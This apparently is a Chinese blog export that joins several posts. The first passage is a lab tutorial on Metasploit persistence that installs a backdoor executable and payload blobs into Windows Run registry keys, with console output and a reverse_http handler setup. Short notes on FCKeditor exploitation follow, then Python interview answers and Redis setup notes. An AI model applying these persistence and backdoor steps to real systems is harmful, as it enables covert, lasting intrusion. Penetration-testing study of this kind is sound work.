[...][*] Creating a meterpreter service on port 31337[*] Creating a temporary installation directory C:\\Users\\TideSec\\AppData\\Local\\Temp\\iInvhjKZbLH...[*] &gt;&gt; Uploading metsrv.x86.dll...[*] &gt;&gt; Uploading metsvc-server.exe...[*] &gt;&gt; Uploading metsvc.exe...[*] Starting the service... Cannot open service manager (0x00000005)meterpreter &gt; lsListing: C:\\Users\\TideSec\\AppData\\Local\\Temp\\iInvhjKZbLH========================================================Mode Size Type Last modified Name---- ---- ---- ------------- ----100666/rw-rw-rw- 178688 fil 2019-06-12 06:46:20 -0700 metsrv.dll100777/rwxrwxrwx 45056 fil 2019-06-12 06:46:21 -0700 metsvc-server.exe100777/rwxrwxrwx 61440 fil 2019-06-12 06:46:21 -0700 metsvc.exe 三个文件上传成功，但服务没有启动起来，失败了。使用-r参数可卸载服务。 3.persistence_exe 再来看看官方推荐的东西吧 123456789101112131415161718192021222324252627282930313233343536373839meterpreter &gt; info post/windows/manage/persistence_exe Name: Windows Manage Persistent EXE Payload Installer Module: post/windows/manage/persistence_exe Platform: Windows Arch: Rank: NormalProvided by: Merlyn drforbin Cousins &lt;drforbin6@gmail.com&gt;Compatible session types: MeterpreterBasic options: Name Current Setting Required Description ---- --------------- -------- ----------- REXENAME default.exe yes The name to call exe on remote system REXEPATH yes The remote executable to upload and execute. SESSION yes The session to run this module on. STARTUP USER yes Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)Description: This Module will upload an executable to a remote host and make it Persistent. It can be installed as USER, SYSTEM, or SERVICE. USER will start on user login, SYSTEM will start on system boot but requires privs. SERVICE will create a new service which will start the payload. Again requires privs.Module options (post/windows/manage/persistence_exe): Name Current Setting Required Description ---- --------------- -------- ----------- REXENAME default.exe yes The name to call exe on remote system REXEPATH yes The remote executable to upload and execute. SESSION yes The session to run this module on. STARTUP USER yes Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE) 此模块将可执行文件上载到远程主机并进行创建持久性。涉及到四个参数 REXENAME是拷贝到目标系统中的名字 EXEPATH是将要上传的后门在本地的位置 SESSION是选择运行此模块的会话 STARTUP是启动类型，有USER、SYSTEM、SERVICE这三种取值，USER表示为将在用户登录时启动，SYSTEM表示将在系统启动时启动(需要权限)，SERVICE表示将创建一个启动服务项(需要权限)。 尝试一下： 12345678910meterpreter &gt; run post/windows/manage/persistence_exe REXENAME=backdoor.exe REXEPATH=/home/ubuntu/shell.exe STARTUP=USER[*] Running module against SAUCERMAN[*] Reading Payload from file /home/ubuntu/shell.exe[+] Persistent Script written to C:\\Users\\TideSec\\AppData\\Local\\Temp\\backdoor.exe[*] Executing script C:\\Users\\TideSec\\AppData\\Local\\Temp\\backdoor.exe[+] Agent executed with PID 3684[*] Installing into autorun as HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\mEMZDQOxkkeebI[+] Installed into autorun as HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\mEMZDQOxkkeebI[*] Cleanup Meterpreter RC File: /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.1023/SAUCERMAN_20190612.1023.rc 4.registry_persistence 完整路径为exploit&#x2F;windows&#x2F;local&#x2F;registry_persistence 和第一种方法类似，此模块将会安装一个payload到注册表的启动项中。 1234567891011121314151617181920212223242526272829303132333435363738meterpreter &gt; background[*] Backgrounding session 13...msf5 auxiliary(server/socks5) &gt; use exploit/windows/local/registry_persistencemsf5 exploit(windows/local/registry_persistence) &gt; show optionsModule options (exploit/windows/local/registry_persistence): Name Current Setting Required Description ---- --------------- -------- ----------- BLOB_REG_KEY no The registry key to use for storing the payload blob. (Default: random) BLOB_REG_NAME no The name to use for storing the payload blob. (Default: random) CREATE_RC true no Create a resource file for cleanup RUN_NAME no The name to use for the &#x27;Run&#x27; key. (Default: random) SESSION yes The session to run this module on. SLEEP_TIME 0 no Amount of time to sleep (in seconds) before executing payload. (Default: 0) STARTUP USER yes Startup type for the persistent payload. (Accepted: USER, SYSTEM)Exploit target: Id Name -- ---- 0 Automaticmsf5 exploit(windows/local/registry_persistence) &gt; set SESSION 13SESSION =&gt; 13msf5 exploit(windows/local/registry_persistence) &gt; run[*] Generating payload blob..[+] Generated payload, 6048 bytes[*] Root path is HKCU[*] Installing payload blob..[+] Created registry key HKCU\\Software\\0BaG3zDR[+] Installed payload blob to HKCU\\Software\\0BaG3zDR\\iiEB4InD[*] Installing run key[+] Installed run key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SMPqA5kB[*] Clean up Meterpreter RC file: /home/ubuntu/.msf4/logs/persistence/192.168.81.154_20190612.2138/192.168.81.154_20190612.2138.rc 同类型的还有其他payload，如exploit&#x2F;windows&#x2F;local&#x2F;vss_persistence，exploit&#x2F;windows&#x2F;local&#x2F;s4u_persistence。 cs大全cs派生msf 123456789msf &gt; use exploit/multi/handler msf exploit(handler) &gt; set payload windows/meterpreter/reverse_httpmsf exploit(handler) &gt; set lhost 192.168.0.143msf exploit(handler) &gt; set lport 4444msf exploit(handler) &gt; exploitcs创建一个windows/foreign/reverse_http的 Listener然后选中对应机器，右键-&gt;Spawn，选择刚刚创建的监听器。","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"},{"name":"msf","slug":"msf","permalink":"http://example.com/tags/msf/"},{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"cs","slug":"cs","permalink":"http://example.com/tags/cs/"},{"name":"命令","slug":"命令","permalink":"http://example.com/tags/%E5%91%BD%E4%BB%A4/"},{"name":"namp","slug":"namp","permalink":"http://example.com/tags/namp/"},{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"}]},{"title":"fck编辑器漏洞利用","slug":"fck编辑器漏洞利用","date":"2022-04-22T11:11:01.000Z","updated":"2022-05-09T11:32:35.845Z","comments":true,"path":"2022/04/22/fck编辑器漏洞利用/","permalink":"http://example.com/2022/04/22/fck%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/","excerpt":"","text":"fck编辑器漏洞利用FCKEditor 富文本编辑器 FCKeditor简介1FCKeditor是一个专门使用在网页上属于开放源代码的所见即所得文字编辑器。它志于轻量化，不需要太复杂的安装步骤即可使用。它可和PHP、 JavaScript、ASP、ASP.NET、ColdFusion、Java、以及ABAP等不同的编程语言相结合。“FCKeditor”名称中的 “FCK” 是这个编辑器的作者的名字Frederico Caldeira Knabben的缩写。FCKeditor 相容于绝大部分的网页浏览器，像是 : Internet Explorer 5.5+ (Windows)、Mozilla Firefox 1.0+、Mozilla 1.3+ 和 Netscape 7+。在未来的版本也将会加入对 Opera 的支援。 判断版本12/fckeditor/editor/dialog/fck_about.html/FCKeditor/_whatsnew.html FCK综合利用工具","categories":[],"tags":[]},{"title":"python面试题1","slug":"python面试题-0","date":"2020-11-20T02:34:44.000Z","updated":"2022-04-08T14:29:40.265Z","comments":true,"path":"2020/11/20/python面试题-0/","permalink":"http://example.com/2020/11/20/python%E9%9D%A2%E8%AF%95%E9%A2%98-0/","excerpt":"python面试题","text":"python面试题 python面试题简述面向对象中__new__和__init__区别 123456789__init__是初始化方法，创建对象后，就立刻被默认调用了，可接收参数1、__new__至少要有一个参数cls，代表当前类，此参数在实例化时由Python解释器自动识别2、__new__必须要有返回值，返回实例化出来的实例，这点在自己实现__new__时要特别注意，可以return父类（通过super(当前类名, cls)）__new__出来的实例，或者直接是object的__new__出来的实例3、__init__有一个参数self，就是这个__new__返回的实例，__init__在__new__的基础上可以完成一些其它初始化的动作，__init__不需要返回值4、如果__new__创建的是当前类的实例，会自动调用__init__函数，通过return语句里面调用的__new__函数的第一个参数是cls来保证是当前类实例，如果是其他类的类名，；那么实际创建返回的就是其他类的实例，其实就不会调用当前类的__init__函数，也不会调用其他类的__init__函数。 简述with方法打开处理文件帮我我们做了什么？ 1打开文件在进行读写的时候可能会出现一些异常状况，如果按照常规的f.open写法，我们需要try,except,finally，做异常判断，并且文件最终不管遇到什么情况，都要执行finally f.close()关闭文件，with方法帮我们实现了finally中f.close python中生成随机整数、随机小数、0–1之间小数方法 12345随机整数：random.randint(a,b),生成区间内的整数随机小数：习惯用numpy库，利用np.random.randn(5)生成5个随机小数0-1随机小数：random.random(),括号中不传参 python2和python3区别？列举5个 1234567891011121314151、Python3 使用 print 必须要以小括号包裹打印内容，比如 print(&#x27;hi&#x27;) Python2 既可以使用带小括号的方式，也可以使用一个空格来分隔打印内容，比如 print &#x27;hi&#x27;2、python2 range(1,10)返回列表，python3中返回迭代器，节约内存3、python2中使用ascii编码，python中使用utf-8编码4、python2中unicode表示字符串序列，str表示字节序列 python3中str表示字符串序列，byte表示字节序列5、python2中为正常显示中文，引入coding声明，python3中不需要6、python2中是raw_input()函数，python3中是input()函数 列出python中可变数据类型和不可变数据类型，并简述原理 1234567# 不可变数据类型：数值型、字符串型string和元组tuple不允许变量的值发生变化，如果改变了变量的值，相当于是新建了一个对象，而对于相同的值的对象，在内存中则只有一个对象（一个地址）# 可变数据类型：列表list和字典dict；允许变量的值发生变化，即如果对变量进行append、+=等这种操作后，只是改变了变量的值，而不会新建一个对象，变量引用的对象的地址也不会变化，不过对于相同的值的不同对象，在内存中则会存在不同的对象，即每个对象都有自己的地址，相当于内存中对于同值的对象保存了多份，这里不存在引用计数，是实实在在的对象。 说明zip（）函数用法 123zip()函数在运算时，会以一个或多个序列（可迭代对象）做为参数，返回一个元组的列表。同时将这些序列中并排的元素配对。zip()参数可以接受任何类型的序列，同时也可以有两个以上的参数;当传入参数的长度不同时，zip能自动以最短序列长度为准进行截取，获得元组。 提高python运行效率的方法 123451、使用生成器，因为可以节约大量内存2、循环代码优化，避免过多重复代码的执行3、核心模块用Cython PyPy等，提高效率4、多进程、多线程、协程5、多个if elif条件判断，可以把最有可能先发生的条件放到前面写，这样可以减少程序判断的次数，提高效率 写一个单列模式 1234567891011121314151617#因为创建对象时__new__方法执行，并且必须return 返回实例化出来的对象所cls.__instance是否存在，不存在的话就创建对象，存在的话就返回该对象，来保证只有一个实例对象存在（单列），打印ID，值一样，说明对象同一个class Singleton(object): __instance = None def __new__(cls,age,name): # 如果类属性__instance的值为None # 那么就创建一个对象,并且赋值为这个对象的引用,保证下次调用这个方法时 # 能够知道之前已经创建过对象了,这样保证只有一个对象 if not cls.__instance: cls.__instance = object.__new__(cls) return cls.__instancea = Singleton(18,&quot;dong&quot;)b = Singleton(8,&quot;dong&quot;)print(id(a))print(id(b))a.age = 19print(b.age) 列出常见的状态码和意义 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455200 OK 请求正常处理完毕204 No Content 请求成功处理，没有实体的主体返回206 Partial Content GET范围请求已成功处理301 Moved Permanently 永久重定向，资源已永久分配新URI302 Found 临时重定向，资源已临时分配新URI303 See Other 临时重定向，期望使用GET定向获取304 Not Modified 发送的附带条件请求未满足307 Temporary Redirect 临时重定向，POST不会变成GET400 Bad Request 请求报文语法错误或参数错误401 Unauthorized 需要通过HTTP认证，或认证失败403 Forbidden 请求资源被拒绝404 Not Found 无法找到请求资源（服务器无理由拒绝）500 Internal Server Error 服务器故障或Web应用故障503 Service Unavailable 服务器超负载或停机维护 列出常见MYSQL数据存储引擎 12345**InnoDB**：支持事务处理，支持外键，支持崩溃修复能力和并发控制。如果需要对事务的完整性要求比较高（比如银行），要求实现并发控制（比如售票），那选择InnoDB有很大的优势。如果需要频繁的更新、删除操作的数据库，也可以选择InnoDB，因为支持事务的提交（commit）和回滚（rollback）。 **MyISAM**：插入数据快，空间和内存使用比较低。如果表主要是用于插入新记录和读出记录，那么选择MyISAM能实现处理高效率。如果应用的完整性、并发性要求比 较低，也可以使用。**MEMORY**：所有的数据都在内存中，数据的处理速度快，但是安全性不高。如果需要很快的读写速度，对数据的安全性要求较低，可以选择MEMOEY。它对表的大小有要求，不能建立太大的表。所以，这类数据库只使用在相对较小的数据库表。 简述同源策略 123456789101112131415同源策略需要同时满足以下三点要求： 1）协议相同 2）域名相同 3）端口相同 http:www.test.com与https:www.test.com 不同源——协议不同 http:www.test.com与http:www.admin.com 不同源——域名不同 http:www.test.com与http:www.test.com:8081 不同源——端口不同 只要不满足其中任意一个要求，就不符合同源策略，就会出现“跨域” 简述多线程、多进程 1234567891011121314151617## 进程： 1、操作系统进行资源分配和调度的基本单位，多个进程之间相互独立2、稳定性好，如果一个进程崩溃，不影响其他进程，但是进程消耗资源大，开启的进程数量有限制## 线程： 1、CPU进行资源分配和调度的基本单位，线程是进程的一部分，是比进程更小的能独立运行的基本单位，一个进程下的多个线程可以共享该进程的所有资源2、如果IO操作密集，则可以多线程运行效率高，缺点是如果一个线程崩溃，都会造成进程的崩溃## 应用： IO密集的用多线程，在用户输入，sleep 时候，可以切换到其他线程执行，减少等待的时间CPU密集的用多进程，因为假如IO操作少，用多线程的话，因为线程共享一个全局解释器锁，当前运行的线程会霸占GIL，其他线程没有GIL，就不能充分利用多核CPU的优势 ** is 和 &#x3D;&#x3D; 的区别 ** is 表示的是对象标示符（object identity），而 &#x3D;&#x3D; 表示的是相等（equality）。 is 的作用是用来检查对象的标示符是否一致，也就是比较两个对象在内存中的地址是否一样，而 &#x3D;&#x3D; 是用来检查两个对象是否相等。但是为了提高系统性能，对于较小的字符串 Python 会保留其值的一个副本，当创建新的字符串的时候直接指向该副本即可。 1234567如：###a = 8b = 8a is b ** 文件读写** 简述文件读取时 read 、readline、readlines 的区别和作用 他们的区别除了读取内容范围不同外，返回的内容类型也不同。 - read()会读取整个文件，将读取到底的文件内容放到一个字符串变量，返回 str 类型。 - readline()读取一行内容，放到一个字符串变量，返回 str 类型。 - readlines() 读取文件所有内容，按行为单位放到一个列表中，返回 list 类型。","categories":[],"tags":[{"name":"面试题","slug":"面试题","permalink":"http://example.com/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/"}]},{"title":"redis数据库","slug":"Redis_01","date":"2020-11-20T01:41:29.000Z","updated":"2022-04-08T16:55:55.912Z","comments":true,"path":"2020/11/20/Redis_01/","permalink":"http://example.com/2020/11/20/Redis_01/","excerpt":"Redis数据库的学习笔记","text":"Redis数据库的学习笔记 Redis数据库一、NoSQL简介NoSQL，泛指非关系型的数据库，有时也称作Not Only SQL的缩写，是对不同于传统的关系型数据库的的统称。 SQL (Structured Query Language) 数据库，指关系型数据库。主要代表：SQL Server，Oracle，MySQL，PostgreSQL。存储数据时，需要预先定义表，字段–关系表 NoSQL（Not Only SQL）泛指非关系型数据库。主要代表：MongoDB，Redis，CouchDB。无表无关联 SQL和NoSQL对比： SQL通常以数据库表形式存储数据。举个栗子，存个学生借书数据： 而NoSQL存储方式比较灵活，比如使用类JSON文件存储上表中熊大的借阅数据： 关系型数据库瓶颈 高并发读写需求 针对网站类用户的并发性访问非常高，而一台数据库的最大连接数有限，且硬盘I&#x2F;O有限，其不能满足很多人同时连接 海量数据的高效率读写 网站每天产生的数据量是巨大的，对于关系型数据库来说，在一张包含海量数据的表中查询，效率是非常低的 查：关系性数据库和非关系性数据库的区别 查：MySQL 与Redis的区别 二、Redis简介1、Redis是什么？ 速度非常快的Nosql数据库，基于key-value的内存存储，同时支持数据持久化到硬盘。 2、Redis的特点 高性能 数据类型丰富 基于内存存储，又支持持久化（将内存中的数据保存到硬盘中） 三、Redis安装1、解压将redis的tar包发送到Linux中，并解压： tar -zxvf redis-3.0.7.tar.gz 2、make指令cd指令切换到解压目录中，然后执行指令: make 执行make的时候，如出现异常： 异常一： make[2]: cc: Command not found 异常原因：没有安装gcc 解决方案：yum install gcc 异常二： zmalloc.h:51:31: error: jemalloc/jemalloc.h: No such file or directory 异常原因：一些编译依赖或原来编译遗留出现的问题 解决方案：make distclean。清理一下，然后再make。 3、make test (直接跳过)在make成功以后，执行指令：make test 在make test时出现异常： 异常一： couldn&#39;t execute &quot;tclsh8.5&quot;: no such file or directory 异常原因：没有安装tcl 解决方案：yum install -y tcl。 4、make install安装，执行指令：make install 5、启动服务 第一种：前台模式，默认配置启动(默认端口6379) 直接执行指令：redis-server 第二种：守护进程(后台)模式,指定配置文件启动 在redis解压根目录中找到配置文件模板(redis.conf)，复制到如下位置： 123cp redis.conf /usr/local/redis_conf/redis.conf# 1. 上述的指令是在redis的解压目录下执行的# 2. redis_conf目录是自己创建的 名字是自定义的 通过vi命令修改 123456789daemonize yes #守护进程模式启动 -- 后台port 7000 #端口 也可以不改pidfile ./redis.pid #进程id存储位置logfile ./redis.log #日志文件存储位置dir /usr/local/redis_conf/ #工作目录 rdb、aof文件存储位置 然后执行 redis-server redis.conf 6、连接Redis执行指令： redis-cli 连接端口为6379 Host为127.0.0.1的redis服务器 redis-cli -p 7000 -h 192.168.1.103 连接端口为7000 Host为192.168.1.103的redis服务器 7、关闭服务redis-cli连接了redis服务器后，可以通过 shutdown 指令关闭连接，并关闭服务 或在命令行中执行 redis-cli -p 7000 shutdown 如果只想关闭连接（客户端），在redis命令中，按Ctrl+c 即可，此时服务不会被关闭 123456789# 关闭连接： 在交互界面，ctrl + c即可，退出交互式界面# 关闭服务： 1. 在交互式界面，输入shutdown指令 2. 在命令行界面，输入连接的指令+shutdown redis-cli -p 7000 shutdown 3. 通过进程号杀掉进程 ps -ef | grep redis kill -9 进程号 四、Redis数据类型Redis支持五种数据类型：string（字符串），list（列表），set（集合）及zset(sorted set：有序集合)，hash（哈希）。 123456# redis数据可以看作是一个大的字典，所有的数据都是以键值对的形式的存在的&#123; 键1：值1， 键2：值2&#125;# 键一般为字符串类型,值的类型可以是以上5种数据类型 1、String字符串用于存单值，常用指令： 命令 说明 示例 set 设置一个key&#x2F;value set name Mr_lee get 根据key获得对应的value get name (keys * &#x2F; keys n*) mset 一次设置多个key value mset age 18 salary 3000 mget 一次获得多个key的value mget name age getset 获得原始key的值，同时设置新值 getset age 20 del 删除key-value del name strlen 获得对应key存储value的长度 strlen name append 为对应key的value追加内容 appdend name 123 getrange 截取value的内容,对原始的值没有影响 getrange name 0 2 setex 设置一个key存活的有效期（秒） setex name 10 tom psetex 设置一个key存活的有效期（毫秒） psetex course10000 redis setnx 只有当这个key不存在时等效set操作 not exist sexnx birth 2020-2-2 msetnx 可以同时设置多个key，在key不存在时有效 msetnx course mysql duration 4 decr 进行数值类型的-1操作 decr age decrby 根据提供的数据进行减法操作 decrby age 3 incr 进行数值类型的+1操作 incr age incrby 根据提供的数据进行加法操作 incrby age 3 incrbyfloat 根据提供的数据加入浮点数 incrbyfloat age 3.5 2、List列表存储多值，常用指令： 1234# python&#123; &#x27;hobby&#x27;:[&#x27;吃饭&#x27;,&#x27;睡觉&#x27;,&#x27;打豆豆&#x27;]&#125; 命令 说明 示例 lpush 将某个值加入到一个key列表头部 lpush users tom lpushx 同lpush,但是必须要保证这个key存在 lpushx users jack rpush 将某个值加入到一个key列表末尾 rpush users linda rpushx 同rpush,但是必须要保证这个key存在 rpushx users james lpop 返回和移除列表的第一个元素 lpop users rpop 返回和移除列表的最后一个元素 rpop users lrange 获取某一个下标区间内的元素 lrange users 0 3 &#x2F; lrange users 0 -1 llen 获取列表元素个数 llen users lset 设置某一个位置的元素(替换已有的某个值) lset users 2 andy lindex 获取某一个位置的元素 lindex users 2 lrem 从列表头起，删除对应个数的指定元素 lrem users 2 james ltrim 保留列表中特定区间内的元素,将其它的元素删除 – 切片 ltrim users 1 3 linsert 在某一个元素之前，之后插入新元素 linsert users before&#x2F;after jack Macle 3、Set集合set是无序集合，并且不允许有相同的元素 常用指令： 命令 说明 示例 sadd 为集合添加元素 sadd st tom smembers 显示集合中所有元素 无序 smembers st scard 返回集合中元素的个数 scard st spop 随机返回并移除一个元素 spop st smove 从一个集合中向另一个集合移动元素 smove st1 st2 tom srem 从集合中删除一个元素 srem st tom sismember 判断一个集合中是否含有这个元素 sismember st tom srandmember 随机返回元素，对原始数据没有影响 srandmember st sdiff 减去两个集合中共有的元素 求差集 sdiff st1 st2 sinter 求交集 sinter st1 st2 sunion 求并集 sunion st1 st2 4、Zset有序集合常用指令： 命令 说明 示例 zadd 添加一个有序集合元素，根据元素的score排序 zadd salary 3000 tom 2000 jack zcard 返回集合的元素个数 zcard salary zrange 返回一个范围内的元素 zrange salary 1 2 withscores zrangebyscore 按照分数查找一个范围内的元素 zrangebyscore salary 1000 2000 zrank 返回对应元素的排名 zrank salary tom zrevrank 返回对应元素倒序排名 zrevrank salary tom zscore 显示某一个元素的分数 zscore salary tom zrem 移除某一个元素 zrem salary tom zincrby 给某个特定元素加分 zincrby salary 100 tom 5、Hash哈希12345678910111213# redis是一个大字典，里面存储的是各种类型的键值对&#123; &#x27;键&#x27;：字符串， &#x27;键&#x27;：列表 []， &#x27;键&#x27;：集合&#123;&#125;， &#x27;键&#x27;：有序集合&#123;0,1,2&#125;， &#x27;键&#x27;：hash&#123;键：值&#125;，&#125;&#123; &quot;user&quot;:&#123;&quot;name&quot;:&quot;Tom&quot;,&quot;age&quot;:18&#125;&#125; 常用指令： 命令 说明 示例 hset 设置一个key&#x2F;value对 hset user name tom hget 获得一个key对应的value hget user name hgetall 获得所有的key&#x2F;value对 hgetall user hdel 删除某一个key&#x2F;value对 hdel user name hexists 判断一个key是否存在 hexists user name hkeys 获得所有的key hkeys user hvals 获得所有的value hvals user hmset 设置多个key&#x2F;value hmset user name tom gender true hmget 获得多个key的value hmget user name age hsetnx 设置一个不存在的key的值 hsetnx user salary 4000 hincrby 为value进行加法运算 hincrby user age 3 hincrbyfloat 为value加入浮点值 hincrbyfloat user age 3.5 五、Redis持久化1、什么是持久化？持久化的含义就是把内存中的数据保存到可永久存储的设备中（磁盘中），以便数据可以重用。 Redis 存：读内存中Redis数据 -&gt; 通过持某种久化的方式 -&gt; 存储到磁盘的文件中 内存-&gt;文件 取：读磁盘文件中的数据 -&gt; 内存中 文件-&gt;内存 众所周知，redis是内存数据库，它把数据存储在内存中，这样在加快读取速度的同时也对数据安全性产生了新的问题，即当redis所在服务器发生宕机后（或服务器进程退出 ），redis数据库里的所有数据将会全部丢失。 为了解决这个问题，redis提供了持久化功能： RDB持久化（snapshotting快照 - 原理是在某个时刻将Redis在内存中的数据库记录dump到磁盘上的RDB文件中实现持久化） AOF持久化（append only file - 原理是将Redis的操作日志以追加的方式写入文件）。 通俗的讲就是将内存中的数据写入硬盘中，当redis重启后，可以从磁盘中恢复数据。 2、RDB持久化2.1 RDB开发步骤编辑redis.conf文件： 123456save 900 1 #900秒内超过1个key被修改 save 300 10 #300秒内超过10个key被修改save 60 10000dbfilename dump.rdb #快照文件名stop-writes-on-bgsave-error yes #快照失败后是否继续写操作rdbcompression yes #是否压缩快照文件 2.2 RDB运行原理 在某些时刻（满足rdb持久化的时刻），Redis通过fork产生子进程，一个父进程的快照(副本)， 其中有和父进程当前时刻相同的数据 父进程继续处理client请求，子进程负责将快照(数据副本)写入临时文件(默认文件名为dump.rdb) 子进程写完后，用临时文件替换原来的快照文件，然后子进程退出。 2.3 RDB触发方式 根据配置 save 900 1 等，在满足条件时自动触发 手动执行 bgsave 指令触发 在后台保存 手动执行 save指令触发，但会造成持久化过程中的主进程阻塞。在主进程阻塞期间，服务器不能处理客户端的任何请求。 （不常用） 如果数据量很大时可以考虑使用，因为不用创建子进程，也就没有子进程抢资源，所以save在生成快照时可以更快(夜深人静时手动触发) 当通过 shutdown 关闭redis时，会自动触发 2.4 RDB注意事项 如果发生系统崩溃，则会丢失最近一次rdb之后的数据，所以如果项目不能接受这样的数据损失，则不建议使用rdb 如果数据量巨大，则创建子进程的时间长，导致redis卡顿，要谨慎设置save参数时间间隔大一些；或如果软件允许，可以每天在闲时手动同步 将生成的快照文件，留在原地，则可以在重启redis后，恢复数据状态 将生成的快照文件，复制到其它redis服务中，可以方便的将数据移植过去 3、AOF持久化Append-Only File（AOF）：与RDB的保存整个redis数据库状态不同，AOF是通过保存对redis服务端的写命令（如set、sadd、rpush）来记录数据库状态的，即保存你对redis数据库的写操作记录。 3.1 AOF运行机制Redis将每一个写操作(执行成功)，写入aof文件，即记录所有的数据改动行为，Redis重启时只要从头到尾执行一次aof文件中的命令，即可恢复数据，也可以将aof文件复制到别的服务器，做数据移植。 注意：在重启时，要恢复数据，如果rdb文件和aof文件同时存在，以AOF为准。 3.2 AOF配置编辑redis.conf文件： 123456789appendonly yes #启动AOF机制# appendfsync always #每次收到写命令就立即强制写入磁盘，保证完全的持久化，但产生极大的IO开销(不推荐使用)appendfsync everysec #每秒钟强制写入磁盘一次，在性能和持久化方面做了很好的折中(推荐使用）# appendfsync no #完全依赖os，虽然基本不对redis性能产生影响，但操作系统的缓存区满时，会阻塞redis(不推荐使用)appendfilename &quot;appendonly.aof&quot; # 设置aof文件名 3.3 AOF细节 AOF文件会不断增长(可能比快照文件大几倍)，在极端情况下，可能会对硬盘空间造成压力 Redis重启时，需要重新执行一个可能非常大的AOF，时间会很长 AOF同步时间间隔小，数据更安全，理论上至多丢失1秒的数据 4、RDB与AOF对比 RDB体量更小，AOF文件体量更大 RDB的同步时间间隔大，AOF同步时间间隔小，所以AOF更能保证数据的安全 RDB有更快的恢复速度，可以用来做数据版本控制。RDB每次进行快照方式会重新记录整个数据集的所有信息。RDB在恢复数据时更快，可以最大化redis性能。 通过使用RDB和AOF，用户可以在重启或系统崩溃后保留数据，但随着负载量变大和数据安全越来越重要，可以使用redis的复制特性做更好的数据安全保障 RDB可以做数据备份，并且要求数据恢复快，对数据一致性要求不高时 123456区别：1. RDB保存的是二进制数据，而AOF保存的是写操作的记录2. RDB是每次保存整个的数据集，而AOF是追加操作3. RDB体量小，AOF体量大4. RDB恢复速度快，而AOF恢复速度慢5. RDB的同步时间间隔大，而AOF同步时间间隔小 5、AOF重写5.1 重写设置AOF采用文件追加的方式持久化数据，所以文件会越来越大，为了避免这种情况发生，增加了重写机制。 为了减小aof文件的体量，可以手动发送 bgrewriteaof 命令，则会创建子进程，通过移除aof文件中的冗余命令来重写aof文件，生成更小体量的aof，然后替换掉旧的、大体量的aof文件 也可以设置：auto-aof-rewrite-percentage 100 ​ auto-aof-rewrite-min-size 64mb 在体量超过64mb，且比上次重写后的体量增加了100%时自动触发重写 5.2 重写原理Redis将AOF重写程序放到子进程（后台）里执行。这样处理的最大好处是： 子进程进行AOF重写期间，主进程可以继续处理命令请求； 子进程带有主进程的数据副本，使用子进程而不是线程，保证数据的安全性。 子进程进行AOF重写的问题： 子进程在进行AOF重写期间，服务器主进程还要继续处理命令请求，而新的命令可能对现有的数据进行修改，这会让当前数据库的数据和&#96;。 解决方案： 为了解决这种数据不一致的问题，Redis增加了一个AOF重写缓存，这个缓存在fork出子进程之后开始启用，Redis服务器主进程在执行完写命令之后，会同时将这个写命令追加到AOF文件和AOF重写缓冲区 即子进程在执行AOF重写时，主进程需要执行以下三个工作： 执行client发来的命令请求； 将写命令追加到现有的AOF文件中； 将写命令追加到AOF重写缓存中。 六、Redis主从1、 简介在高负载和对数据要求高完整性时，数据的复制是不可或缺的。一个Redis主服务器，并为其关联多个从服务器，主服务器会将自己的数据状态不断地同步给从服务器，即，从服务器中会持有主服务器最新的数据副本，则首先为数据完整性提供了进一步的保证，而且所有读取操作都可均衡的负载到多个从服务器中，主服务器主要负责写操作。则主从多个服务器实现读写分离，提供更好的数据完整性，和更强的负载能力。 2、主从配置开启两个redis服务器，一个做主服务器，另一个做从服务器。主从两台服务器的配置没有额外的改变，只是在从服务器的配置中添加一句配置： 12345replicaof host port 比如：replicaof 192.168.1.103 7000则如上配置将当前的redis服务器设置为(192.168.1.103:7000)的从服务器# 注意：需要开放主服务器的ip# 在主服务器的 redis.conf文件中 修改bind 0.0.0.0 如此，则主服务器的所有数据会在初始接收到从服务器的连接时全部发送到从服务器。之后每次主服务器执行完一个写操作，都会发送到从服务器。如上则是主从的运行模式。 可以向如上设置多台从服务器，则以后的所有读取操作由从服务器完成，主服务器只负责写操作。","categories":[{"name":"redis","slug":"redis","permalink":"http://example.com/categories/redis/"}],"tags":[{"name":"redis","slug":"redis","permalink":"http://example.com/tags/redis/"}]},{"title":"redis集群","slug":"Redis_02","date":"2020-11-20T01:41:29.000Z","updated":"2022-04-08T16:55:20.121Z","comments":true,"path":"2020/11/20/Redis_02/","permalink":"http://example.com/2020/11/20/Redis_02/","excerpt":"Redis数据库的集群学习笔记","text":"Redis数据库的集群学习笔记 Redis-集群一、简介Redis 在3.0版本前只支持单实例模式，虽然支持主从模式部署来解决单点故障，但是现在互联网企业动辄大几百G的数据，完全无法满足业务的需求，所以，Redis 在 3.0 版本以后就推出了集群模式。 将多台redis服务器组成集群，分担负载。相对于主从架构，是进一步的扩展和升级。集群中的多台主服务器同时对外提供读写功能，并分担整体的负载压力。而且每台主服务器都还会有自己的从服务器，作为数据副本，也作为主服务器的候补，当主服务器意外崩溃，则从服务器自动成为主服务器，保证了整个集群的高可用性。 在负载压力分担，和系统的高可用性上，集群是很好的解决方案 。 二、集群搭建1、配置集群服务器 启动至少6个redis服务器（3主3从），每台服务器在配置中要增加： 12345cluster-enabled yes #开启集群支持cluster-config-file nodes.conf #记录节点信息bind 0.0.0.0 #开放所有ip 以各自的配置开启所有服务器 123456redis-server 7001/redis.confredis-server 7002/redis.confredis-server 7003/redis.confredis-server 7004/redis.confredis-server 7005/redis.confredis-server 7006/redis.conf 2、创建redis集群2.1 创建Redis集群1redis-cli --cluster create 192.168.134.124:7001 192.168.134.124:7002 192.168.134.124:7003 192.168.134.124:7004 192.168.134.124:7005 192.168.134.124:7006 --cluster-replicas 1 --cluster-replicas 1 表示主从复制比例为 1:1，即一个主节点对应一个从节点；然后，默认给我们分配好了每个主节点和对应从节点服务器，以及 slot 的大小，因为在 Redis 集群中有且仅有 16384 个 slot 